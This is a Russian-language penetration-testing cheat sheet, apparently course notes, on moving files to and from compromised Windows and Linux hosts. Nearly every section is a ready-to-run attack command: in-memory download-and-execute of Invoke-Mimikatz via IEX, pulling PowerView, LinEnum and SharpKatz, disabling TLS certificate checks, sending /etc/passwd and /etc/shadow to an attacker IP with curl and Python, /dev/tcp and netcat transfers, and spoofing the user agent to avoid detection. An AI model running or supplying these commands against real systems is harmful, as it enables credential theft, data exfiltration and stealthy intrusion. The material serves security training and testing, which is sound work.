#windows #file #tranport

# Оглавление

1) [[#ПЕРЕДАЧА ФАЙЛОВ В WINDOWS]]
2) [[#ПЕРЕДАЧА ФАЙЛОВ В LINUX]]
3) [[#ПЕРЕДАЧА ФАЙЛОВ КОДОМ]]
4) [[#ПЕРЕДАЧА ФАЙЛОВ ЧЕРЕЗ NC]]
5) [[#ПЕРЕДАЧА ФАЙЛОВ ЧЕРЕЗ WinRM и RDP]]
6) [[#ЗАЩИЩЕННАЯ ПЕРЕДАЧА ФАЙЛОВ]]
7) [[#Маскирование User Agent]]

# ПЕРЕДАЧА ФАЙЛОВ В **WINDOWS**
# Скачивание файлов
## 1) Стандартные Windows средства  
Командлеты для скачивания файлов
1) `Net.WebClient`
загрузка файлом
```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

загрузка в память (Invoke-Expression)
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

2) Invoke-WebRequest
```powershell
iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Обход ошибки браузер (**-UseBasicParsing**)
```powershell
iwr https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Обход ошибка канала TLS
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## 2) SMB share

Создаем SMB сервер 
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Подключение к серверу
```powershell
net use n: \\192.168.220.133\share /user:test test
```

Скачивание файла
```powershell
copy n:\nc.exe
```

## 3) FTP

Настройка FTP сервера
```bash
sudo pip3 install pyftpdlib
```

```bash
sudo python3 -m pyftpdlib --port 21
```

Скачивание файла по FTP
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```


# Загрузка файлов

## 1) Base64

Кодируем
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

Декодируем
```bash
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjA...9jYWxob3N0DQo= | base64 -d > hosts
```

## 2) Base64 для передачи через Invoke-WebRequest

Кодируем
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

iwr -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Принимаем
```bash
nc -nlvp 8000
```

## 3) WebDAV

> Этот протокол используется SMB over HTTP
> Когда вы используете `SMB`Сначала программа попытается подключиться, используя протокол SMB, а если доступной общей папки SMB нет, попытается подключиться по протоколу HTTP.

Создаем сервер
```bash
sudo pip3 install wsgidav cheroot
```

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

Подключение к шаре
```powershell
dir \\192.168.49.128\DavWWWRoot
```

DavWWWRoot - Мы сообщаем, что подключаемся к корневому каталогу

Загрузка файлов
```powershell
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder
```

## 4) Загрузка по FTP

Поднятие сервера
```bash
sudo python3 -m pyftpdlib --port 21 --write
```

Загрузка файла
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

---

# ПЕРЕДАЧА ФАЙЛОВ В **LINUX**

## 1) Загрузка через Bash

Подключение к веб серверу
```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

Dыполенние HTTP запросов
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

```bash
cat <&3
```

## 2) Создание Веб-серверов

Ruby
```bash
ruby -run -ehttpd . -p8000
```

PHP
```bash
php -S 0.0.0.0:8000
```

#### python3 over HTTPS

Запуск сервера
```bash
sudo python3 -m pip install --user uploadserver
```

Создание самоподписанного сертификата
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

Запуск веб-сервера с приватным ключем
```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Загрузка файлов
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

---
# ПЕРЕДАЧА ФАЙЛОВ КОДОМ

## 1) Python3
```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## 2) PHP
```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

```bash
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
## 3) Ruby 

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

## 4) Perl

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

--- 

# ПЕРЕДАЧА ФАЙЛОВ ЧЕРЕЗ NC

Прием
```bash
nc 192.168.49.128 443 > SharpKatz.exe
```
или
```bash
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
или
```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

Отправка
```bash
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
или
```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

---

# ПЕРЕДАЧА ФАЙЛОВ ЧЕРЕЗ WinRM и RDP

Мы можем использовать `Copy-Item`командлет для копирования файла с локального компьютера `DC01`к `DATABASE01`у нас есть сессия `$Session`или наоборот

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

Из локального на удаленный
```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

С Удаленного на локальный
```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```


## Монтирование папок

```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

---

# ЗАЩИЩЕННАЯ ПЕРЕДАЧА ФАЙЛОВ

> Необходимо обеспечивать защищенную передачу, чтобы данные не были прочитаны в случае перехвата, например, NTDS.dit, ПДн и тд

Скрипт для шифрования файлов в Windows [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)

Использовать скрипт
```powershell
Import-Module .\Invoke-AESEncryption.ps1
```

Зашифровать файл
```powershell
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

## Работа с OpenSSL

- Используем алгоритм aes256
- Кастомное кол-во итераций 
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

enter aes-256-cbc encryption password:                                                         
Verifying - enter aes-256-cbc encryption password: 
```

Расшифровка
```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd    

enter aes-256-cbc decryption password:
```

---

# Маскирование User Agent

У каждого инструмента отправки запросов есть свой UserAgent, это в том числе может быть дополнительным IoC 
Чтобы этого избежать, его можноподменять

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```